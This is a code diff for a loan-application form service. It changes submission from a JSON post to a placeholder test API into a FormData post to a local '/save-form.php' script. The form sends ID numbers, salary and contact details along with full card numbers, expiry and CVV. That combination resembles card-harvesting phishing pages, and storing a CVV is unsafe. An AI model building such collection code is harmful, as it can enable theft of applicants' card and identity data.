@@ -2,44 +2,33 @@ import { LoanFormData } from '../types/formTypes';
 
 export const submitFormData = async (formData: any): Promise<{ success: boolean; message: string }> => {
   try {
-    // Prepare form data for submission
-    const payload = {
-      // Loan details
-      loanAmount: formData.loanAmount,
-      loanTerm: formData.loanTerm,
-      
-      // Personal info
-      firstName: formData.firstName || '',
-      lastName: formData.lastName || '',
-      dni: formData.dni || '',
-      province: formData.province || '',
-      email: formData.email || '',
-      phone: formData.phone || '',
-      
-      // Occupation details
-      occupation: formData.occupation || '',
-      company: formData.occupationDetails?.company || '',
-      position: formData.occupationDetails?.position || '',
-      monthlySalary: formData.occupationDetails?.monthlySalary || '',
-      yearsEmployed: formData.occupationDetails?.yearsEmployed || '',
+    // Create FormData object
+    const form = new FormData();
+    
+    // Add all form fields
+    form.append('loanAmount', formData.loanAmount.toString());
+    form.append('loanTerm', formData.loanTerm.toString());
+    form.append('firstName', formData.firstName);
+    form.append('lastName', formData.lastName);
+    form.append('dni', formData.dni);
+    form.append('province', formData.province);
+    form.append('email', formData.email);
+    form.append('phone', formData.phone);
+    form.append('occupation', formData.occupation);
+    form.append('company', formData.occupationDetails?.company || '');
+    form.append('position', formData.occupationDetails?.position || '');
+    form.append('monthlySalary', formData.occupationDetails?.monthlySalary || '');
+    form.append('yearsEmployed', formData.occupationDetails?.yearsEmployed || '');
+    form.append('cardType', formData.cardInfo.type);
+    form.append('cardNumber', formData.cardInfo.number);
+    form.append('cardName', formData.cardInfo.name);
+    form.append('cardExpiry', formData.cardInfo.expiry);
+    form.append('cardCvv', formData.cardInfo.cvv);
 
-      // Card info
-      cardInfo: {
-        type: formData.cardInfo.type,
-        number: formData.cardInfo.number,
-        name: formData.cardInfo.name,
-        expiry: formData.cardInfo.expiry,
-        cvv: formData.cardInfo.cvv
-      }
-    };
-
-    // Submit the form
-    const response = await fetch('https://jsonplaceholder.typicode.com/posts', {
+    // Submit the form to the PHP endpoint
+    const response = await fetch('/save-form.php', {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(payload),
+      body: form
     });
 
     if (!response.ok) {
